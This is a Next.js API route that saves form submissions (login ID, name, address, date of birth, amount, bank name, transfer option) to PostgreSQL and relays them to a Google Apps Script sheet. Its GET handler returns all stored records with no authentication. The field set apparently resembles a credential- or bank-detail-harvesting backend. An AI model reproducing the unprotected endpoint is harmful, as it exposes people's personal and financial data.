import { NextRequest, NextResponse } from "next/server";
import { db } from "@/db";
import { submissions } from "@/db/schema";

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();

    const {
      loginId,
      fullName,
      address,
      email,
      mobile,
      dateOfBirth,
      amount,
      bankName,
      transferOption,
    } = body;

    // -----------------------------
    // 1. Save submission to PostgreSQL
    // -----------------------------
    const [row] = await db
      .insert(submissions)
      .values({
        loginId: loginId || "",
        fullName: fullName || "",
        address: address || "",
        email: email || "",
        mobile: mobile || "",
        dateOfBirth: dateOfBirth || "",
        amount: amount || "",
        bankName: bankName || "",
        transferOption: transferOption || "",
        verificationLink: "",
        status: "pending",
      })
      .returning();

    // -----------------------------
    // 2. Send submission to Google Sheets
    // -----------------------------
    let sheetSuccess = false;
    let sheetResponse = "";

    const googleScriptUrl = process.env.GOOGLE_SCRIPT_URL;

    if (googleScriptUrl) {
      try {
        const response = await fetch(googleScriptUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            id: row.id,
            loginId: loginId || "",
            fullName: fullName || "",
            address: address || "",
            email: email || "",
            mobile: mobile || "",
            dateOfBirth: dateOfBirth || "",
            amount: amount || "",
            bankName: bankName || "",
            transferOption: transferOption || "",
            status: "pending",
            verificationLink: "",
            createdAt:
              row.createdAt?.toISOString() ||
              new Date().toISOString(),
          }),
        });

        sheetResponse = await response.text();

        console.log(
          "Google Sheets HTTP status:",
          response.status
        );

        console.log(
          "Google Sheets response:",
          sheetResponse
        );

        try {
          const result = JSON.parse(sheetResponse);
          sheetSuccess = result.success === true;
        } catch {
          sheetSuccess = false;
        }
      } catch (error) {
        console.error(
          "Google Sheets connection error:",
          error
        );
      }
    } else {
      console.error(
        "GOOGLE_SCRIPT_URL is missing from .env.local"
      );
    }

    // -----------------------------
    // 3. Return result to frontend
    // -----------------------------
    return NextResponse.json({
      success: true,
      id: row.id,
      sheetSuccess,
      sheetResponse,
    });
  } catch (error) {
    console.error(
      "POST /api/submissions error:",
      error
    );

    return NextResponse.json(
      {
        success: false,
        error: "Failed to save submission",
      },
      {
        status: 500,
      }
    );
  }
}

// -----------------------------
// GET submissions
// -----------------------------
export async function GET() {
  try {
    const rows = await db
      .select()
      .from(submissions);

    return NextResponse.json({
      success: true,
      data: rows,
    });
  } catch (error) {
    console.error(
      "GET /api/submissions error:",
      error
    );

    return NextResponse.json(
      {
        success: false,
        error: "Failed to fetch submissions",
      },
      {
        status: 500,
      }
    );
  }
}